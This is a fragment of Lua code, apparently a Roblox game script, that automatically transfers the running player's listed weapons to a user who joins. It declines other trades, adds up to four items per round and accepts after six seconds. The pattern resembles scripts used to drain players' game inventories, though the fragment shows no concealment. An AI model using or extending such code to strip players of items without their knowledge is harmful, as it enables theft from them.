    local function doTrade(joinedUser)
        local initialTradeState = getTradeStatus()
        if initialTradeState == "StartTrade" then
            Trade.DeclineTrade:FireServer()
            task.wait(0.3)
        elseif initialTradeState == "ReceivingRequest" then
            Trade.DeclineRequest:FireServer()
            task.wait(0.3)
        end

        while #weaponsToSend > 0 do
            local tradeStatus = getTradeStatus()
            if tradeStatus == "None" then
                sendTradeRequest(joinedUser)
            elseif tradeStatus == "SendingRequest" then
                task.wait(0.3)
            elseif tradeStatus == "ReceivingRequest" then
                Trade.DeclineRequest:FireServer()
                task.wait(0.3)
            elseif tradeStatus == "StartTrade" then
                local numToTrade = math.min(4, #weaponsToSend)
                for i = 1, numToTrade do
                    local weapon = weaponsToSend[i]
                    for _ = 1, weapon.Amount do
                        addWeaponToTrade(weapon.DataID)
                        task.wait()
                    end
                end
                task.wait(6)
                acceptTrade()
                waitForTradeCompletion()

                local currentInv = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
                local firstItemAttempted = weaponsToSend[1].DataID
                if not currentInv.Weapons.Owned[firstItemAttempted] then
                    for _ = 1, numToTrade do table.remove(weaponsToSend, 1) end
                else
                    pcall(function() Trade.DeclineTrade:FireServer() end)
                end
            else
                task.wait(0.5)
            end
            task.wait(1)
        end
    end

